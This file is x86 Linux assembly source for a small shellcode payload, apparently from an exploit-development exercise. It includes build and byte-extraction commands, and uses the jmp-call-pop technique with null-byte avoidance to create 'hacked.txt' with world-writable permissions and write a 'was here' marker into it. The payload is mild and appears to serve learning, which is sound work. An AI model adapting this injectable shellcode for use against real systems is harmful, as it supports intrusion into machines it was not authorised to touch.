; USAGE:
; Compile for x86: "nasm -f elf32 p1_shellcode.asm"
; Link for x86: "ld -m elf_i386 p1_shellcode.o -o p1_shellcode"
; Extract raw shellcodel: "for i in $(objdump -d p1_shellcode | grep "^ " |cut -f2); do echo -n '\x'$i; done; echo"

section .text

    global _start

_start:

    jmp short strings                       ; Jump to label for string storage segment 

code:

    pop         esi                         ; Recover string storage address
    xor         eax, eax                    ; Clear register
    mov byte    [esi + 0xa], al             ; Terminate file name string (adjust offest for new strings)
    mov byte    [esi + 0x1c], al            ; Terminate file message string (adjust offset for new strings)

    mov byte    al, 0x5                     ; Syscall open()
    lea         ebx, [esi]                  ; Pointer to file name
    xor         ecx, ecx                    ; Clear register
    mov byte    cl, 0x42                    ; Open mode: (create if doesn't exist) + (RW)
    xor         edx, edx                    ; Clear register
    mov word    dx, 0x1ff                   ; File permissions: RWX for all
    int         0x80                        ; Interrupt kernel

    mov         ebx, eax                    ; File descriptor returned from open() call
    xor         eax, eax                    ; Clear register
    mov byte    al, 0x4                     ; Syscall write()
    lea         ecx, [esi + 0xb]            ; Pointer to file message (adjust offset for new strings)
    xor         edx, edx                    ; Clear register
    mov byte    dl, 0x12                    ; File message length (adjust offset for new strings)
    int         0x80                        ; Interrupt kernel
        
    xor         eax, eax                    ; Clear register
    mov byte    al, 0x6                     ; Syscall close()
    int         0x80                        ; Interrupt kernel

    xor         eax, eax                    ; Clear register
    mov byte    al, 0x1                     ; Syscall exit()
    xor         ebx, ebx                    ; Exit with return code of 0 (no error)
    int         0x80                        ; Interrupt kernel

strings:

    call        code                        ; Use call to push string storage address onto stack

    db          'hacked.txt#'               ; File to open/create, # = placeholde
    db          'tnballo was here!#'        ; Message to write to file, # = placeholder

